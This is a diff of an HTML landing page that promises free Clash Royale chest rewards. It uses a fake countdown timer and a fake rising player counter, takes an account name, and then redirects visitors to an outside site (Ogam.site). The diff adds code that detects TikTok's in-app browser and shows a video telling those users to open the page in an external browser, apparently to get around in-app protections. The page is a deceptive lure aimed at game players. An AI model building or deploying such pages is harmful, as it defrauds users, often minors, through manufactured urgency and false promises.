@@ -1,26 +1,3 @@
-<div id="videoPage" style="background:black;color:white;text-align:center;padding:20px">
-
-<h2>Follow The Steps</h2>
-
-<video width="300" autoplay muted controls>
-<source src="tutorial.mp4" type="video/mp4">
-</video>
-
-<p>
-1. Tap the 3 dots<br>
-2. Tap Open in Browser<br>
-3. Then press Continue
-</p>
-
-<button onclick="continueSite()">Continue</button>
-
-</div>
-
-<script>
-function continueSite(){
-document.getElementById("videoPage").style.display="none";
-}
-</script>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -30,7 +7,7 @@ document.getElementById("videoPage").style.display="none";
 <style>
 body {
   margin:0; padding:0; font-family: Arial,sans-serif; color:white; text-align:center; overflow-x:hidden;
-  background: #000000; /* solid black background */
+  background: #000000;
 }
 header {padding:30px; font-size:36px; font-weight:bold; text-shadow: 2px 2px 10px #facc15;}
 .container {padding:80px 20px;}
@@ -53,41 +30,69 @@ footer {padding:30px; font-size:16px; color:#9ca3af;}
   .timer {font-size:22px;}
   .stats {font-size:20px;}
 }
+.videoBox{
+  display:none;
+  max-width:400px;
+  margin:auto;
+  background:#111;
+  padding:20px;
+  border-radius:12px;
+  text-align:center;
+}
+.videoBox video{
+  width:100%;
+  border-radius:10px;
+  margin-top:15px;
+}
+.videoBox button{
+  margin-top:20px;
+  background:#ffcc00;
+  border:none;
+  padding:15px 30px;
+  font-size:18px;
+  border-radius:8px;
+  cursor:pointer;
+}
 </style>
-<!-- Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-NPNW091TKK"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-NPNW091TKK');
-</script>
 </head>
 <body>
 
-<header>🏆 Clash Royale Chest Rewards</header>
+<!-- Video for TikTok users only -->
+<div id="videoPage" class="videoBox">
+  <h2>⚠️ Follow The Steps</h2>
+  <video autoplay muted controls>
+    <source src="tutorial.mp4" type="video/mp4">
+  </video>
+  <p>
+    1️⃣ Tap the 3 dots<br>
+    2️⃣ Tap Open in Browser<br>
+    3️⃣ Then press Continue
+  </p>
+  <button onclick="continueSite()">Continue</button>
+</div>
 
+<!-- Original landing page content -->
+<div id="landingContent">
+<header>🏆 Clash Royale Chest Rewards</header>
 <div class="container">
   <h1>🎁 Claim Your Chest Rewards Now!</h1>
   <p>Enter your Clash Royale account name below to get your chest instantly.</p>
 
   <div class="timer">Offer expires in <span id="countdown">01:00:00</span></div>
 
-  <input type="text" id="username" placeholder="Your account name" required>
-  <br>
+  <input type="text" id="username" placeholder="Your account name" required><br>
   <button class="btn" onclick="submitForm()">Verify</button>
 
   <div class="stats">
     <p>Today <span id="counter">97</span> players have opened their chests</p>
   </div>
 </div>
-
 <footer>&copy; 2026 Clash Royale Rewards. All rights reserved.</footer>
+</div>
 
 <script>
-// --- Countdown 1 hour ---
-let totalTime = 60*60; // 1 hour in seconds
+// Countdown 1 hour
+let totalTime = 60*60;
 const countdownEl = document.getElementById('countdown');
 const countdownInterval = setInterval(()=>{
   let hours = Math.floor(totalTime/3600);
@@ -103,7 +108,7 @@ const countdownInterval = setInterval(()=>{
   }
 },1000);
 
-// --- Animated counter starting at 97 ---
+// Animated counter
 let counterEl = document.getElementById('counter');
 let counter = 97;
 function updateCounter(num){
@@ -122,7 +127,7 @@ setInterval(()=>{
   updateCounter(counter);
 },2500+Math.random()*1000);
 
-// --- Confetti effect ---
+// Confetti effect
 function createConfetti(){
   for(let i=0;i<50;i++){
     const confetti=document.createElement('div');
@@ -135,12 +140,26 @@ function createConfetti(){
   }
 }
 
-// --- Submit form safely ---
+// Submit form safely
 function submitForm(){
   const username=document.getElementById('username').value.trim();
   if(!username){alert('Please enter your account name!'); return;}
   createConfetti();
   setTimeout(()=>{window.location.href='https://Ogam.site/cl/i/n66xj9';},1000);
+}
+
+// Video logic for TikTok users only
+function continueSite(){
+  document.getElementById("videoPage").style.display="none";
+  document.getElementById("landingContent").style.display="block";
+}
+var ua = navigator.userAgent.toLowerCase();
+if(ua.indexOf("tiktok") !== -1){
+  document.getElementById("videoPage").style.display="block";
+  document.getElementById("landingContent").style.display="none";
+}else{
+  document.getElementById("videoPage").style.display="none";
+  document.getElementById("landingContent").style.display="block";
 }
 </script>
 
